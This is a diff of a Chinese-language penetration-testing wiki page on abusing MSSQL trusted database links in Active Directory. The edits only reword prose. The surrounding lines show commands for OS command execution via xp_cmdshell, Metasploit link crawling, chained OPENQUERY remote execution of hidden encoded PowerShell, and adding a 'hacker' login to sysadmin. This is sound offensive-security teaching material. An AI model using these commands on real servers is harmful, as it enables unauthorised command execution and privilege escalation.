@@ -161,14 +161,15 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ```
 ### MSSQL RCE
 
-在 MSSQL 主机内部**执行命令**也可能是可行的。
+这也可能在 MSSQL 主机内部 **执行命令**。
 ```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-检查**以下部分**中提到的页面以手动执行此操作。
+检查**以下部分中提到的页面以手动执行此操作。**
 
 ### MSSQL 基本黑客技巧
+
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
@@ -178,7 +179,7 @@ Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResu
 
 如果一个 MSSQL 实例被另一个 MSSQL 实例信任（数据库链接）。如果用户对受信任的数据库拥有权限，他将能够**利用信任关系在另一个实例中执行查询**。这些信任可以链式连接，在某些情况下，用户可能能够找到一些配置错误的数据库，在那里他可以执行命令。
 
-**数据库之间的链接甚至可以跨越森林信任。**
+**数据库之间的链接甚至可以跨森林信任工作。**
 
 ### Powershell 滥用
 ```bash
@@ -220,7 +221,7 @@ inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:
 ```
 ### Metasploit
 
-您可以使用metasploit轻松检查受信任的链接。
+您可以使用 metasploit 轻松检查受信任的链接。
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -252,11 +253,11 @@ EXEC sp_linkedservers;
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
 > [!WARNING]
-> 检查双引号和单引号的使用，正确使用它们非常重要。
+> 检查双引号和单引号的使用方式，正确使用它们非常重要。
 
 ![](<../../images/image (643).png>)
 
-您可以手动无限期地继续这些受信任链接的链。
+您可以手动无限制地继续这些受信任链接的链条。
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -286,6 +287,7 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 
 ### SCCM 管理点 NTLM 中继 (OSD 秘密提取)
 查看 SCCM **管理点** 的默认 SQL 角色如何被滥用，以直接从站点数据库中转储网络访问账户和任务序列秘密：
+
 {{#ref}}
 sccm-management-point-relay-sql-policy-secrets.md
 {{#endref}}
